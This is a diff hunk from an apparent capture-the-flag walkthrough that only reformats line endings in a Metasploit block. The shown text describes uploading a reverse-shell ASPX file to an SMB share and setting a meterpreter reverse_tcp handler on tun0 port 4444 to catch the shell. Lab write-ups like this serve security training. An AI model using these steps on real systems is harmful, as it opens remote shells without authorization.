@@ -27,11 +27,11 @@ To get the info on arch google the service info form the nmap scan.
 We upload this to nt4wrksv share using the `put` command.
 Now we set up a handler on metasploit.
 
-`use exploit/multi/handler\
- set payload windows/x64/meterpreter/reverse_tcp\
- set lhost tun0\
- set lport 4444\
- run\
+`use exploit/multi/handler    
+ set payload windows/x64/meterpreter/reverse_tcp    
+ set lhost tun0    
+ set lport 4444    
+ run    
 `
 
 Now that we have this setup we can trigger the rev.aspx either by a curl command or by manually going there in a web browser.
